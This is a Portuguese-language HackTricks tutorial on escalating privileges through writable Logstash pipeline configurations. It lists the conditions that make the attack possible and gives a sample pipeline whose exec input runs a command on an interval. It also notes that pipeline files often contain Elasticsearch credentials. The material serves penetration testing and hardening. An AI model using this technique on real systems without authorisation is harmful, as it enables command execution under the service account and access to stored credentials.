{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash é usado para **coletar, transformar e enviar logs** através de um sistema conhecido como **pipelines**. Esses pipelines são compostos por estágios de **entrada**, **filtro** e **saída**. Um aspecto interessante surge quando o Logstash opera em uma máquina comprometida.

### Configuração do Pipeline

Os pipelines são configurados no arquivo **/etc/logstash/pipelines.yml**, que lista os locais das configurações do pipeline:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Este arquivo revela onde os arquivos **.conf**, contendo configurações de pipeline, estão localizados. Ao empregar um **módulo de saída Elasticsearch**, é comum que os **pipelines** incluam **credenciais do Elasticsearch**, que frequentemente possuem extensos privilégios devido à necessidade do Logstash de gravar dados no Elasticsearch. Caracteres curinga em caminhos de configuração permitem que o Logstash execute todos os pipelines correspondentes no diretório designado.

### Escalada de Privilégios via Pipelines Graváveis

Para tentar a escalada de privilégios, primeiro identifique o usuário sob o qual o serviço Logstash está sendo executado, tipicamente o usuário **logstash**. Certifique-se de atender a **um** desses critérios:

- Possuir **acesso de gravação** a um arquivo de pipeline **.conf** **ou**
- O arquivo **/etc/logstash/pipelines.yml** usa um curinga, e você pode gravar na pasta de destino

Além disso, **uma** dessas condições deve ser cumprida:

- Capacidade de reiniciar o serviço Logstash **ou**
- O arquivo **/etc/logstash/logstash.yml** tem **config.reload.automatic: true** definido

Dado um curinga na configuração, criar um arquivo que corresponda a esse curinga permite a execução de comandos. Por exemplo:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Aqui, **interval** determina a frequência de execução em segundos. No exemplo dado, o comando **whoami** é executado a cada 120 segundos, com sua saída direcionada para **/tmp/output.log**.

Com **config.reload.automatic: true** em **/etc/logstash/logstash.yml**, o Logstash detectará e aplicará automaticamente novas ou modificações nas configurações do pipeline sem precisar de um reinício. Se não houver um caractere curinga, modificações ainda podem ser feitas nas configurações existentes, mas é aconselhável ter cautela para evitar interrupções.

## References

{{#include ../../banners/hacktricks-training.md}}
